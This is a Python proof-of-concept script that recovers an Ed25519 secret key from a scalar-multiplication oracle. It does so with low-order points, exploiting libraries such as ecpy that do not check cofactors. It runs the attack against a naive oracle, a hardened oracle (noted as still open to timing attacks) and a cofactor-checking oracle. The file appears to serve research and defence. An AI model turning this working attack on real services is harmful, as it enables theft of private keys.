from ecpy.curves import Curve
import base64
import objective_sodium

"""demonstrates an attack on an ed25519 multiplication oracle using low order points
affects libraries that don't check points have zeroed cofactor (EG:ecpy) ECPY
implementation can be hardened to resist the attack alternatively use a library
that checks its points

Note:the oracle in this attack accepts a parameter "multiple" which multiplies
the secret scalar prior to multiplication. Someone can generate multiples of
your public key to use as a new public key others won't recognise.
"""

cv = Curve.get_curve('Ed25519')

#generator for low order group G
single=cv.decode_point(base64.b16decode(
    b'26E8958FC2B227B045C3F489F2EF98F0D5DFAC05D3C63339B13802886D53FC05'))
inv8=int(1/objective_sodium.Scalar(8))
lo_list=[(cv.generator+single)*i-cv.generator*i for i in range(8,16)]
def get_lo(X):
    #get the low order group information from a point
    X_lo=X-X*8*inv8 #isolate LO info
    return lo_list.index(X_lo) #find it in the list

def low_order_attack(public_key,mul_oracle):
    """given a multiplication oracle F(P,v)=P*(secret*v) , perform an attack using low order points to find the secret"""
    val=0
    P=cv.generator+single
    multiple=1
    for i in range(128):
        Q=cv.decode_point(mul_oracle(cv.encode_point(P), multiple))
        bits=get_lo(Q)
        val=(val&~7)+bits
        #check for doneness
        maybe=val*(8**i)%cv.order
        if cv.generator*maybe==public_key:
            print("success after %i rounds"%(i))
            return maybe
        #we got some bits, now shift things
        val=val*inv8%cv.order
        multiple=multiple*inv8%cv.order
    print("failed")
    return None


secret_key=0xda60b01d6ed30131903539014f529dcc12b1496d16309ea84676097ee0424bf
public_key=cv.generator*secret_key

def mul_oracle(X,v):
    X=cv.decode_point(X)
    val=(X*((v*secret_key)%cv.order))
    return cv.encode_point(val)

def mul_oracle_secure(X,v):
    X=cv.decode_point(X)
    #don't leak low order bits
    #note: this is still vulnerable to a timing attack
    val=(X*8*((v*secret_key*inv8)%cv.order))
    return cv.encode_point(val)

#use Scalar class for constant time scalar arithmetic
secret_Scalar=objective_sodium.Scalar(secret_key)
def mul_oracle_objective_sodium(X,v):
    """This one uses the objective sodium library
    All point multiplications check cofactor is cleared"""
    X=objective_sodium.Ed25519.decode_point(X)
    try:val=(X*(v*secret_Scalar))
    except RuntimeError:#low order point
        return b"\0"*32 #return zero
    return objective_sodium.Ed25519.encode_point(val)

if __name__=="__main__":
    print("trying naive multiplication oracle",end="\n  ")
    s=low_order_attack(public_key,mul_oracle)
    print("trying hardened multiplication oracle",end="\n  ")
    s=low_order_attack(public_key,mul_oracle_secure)
    print("trying naive(objective_sodium) multiplication oracle",end="\n  ")
    s=low_order_attack(public_key,mul_oracle_objective_sodium)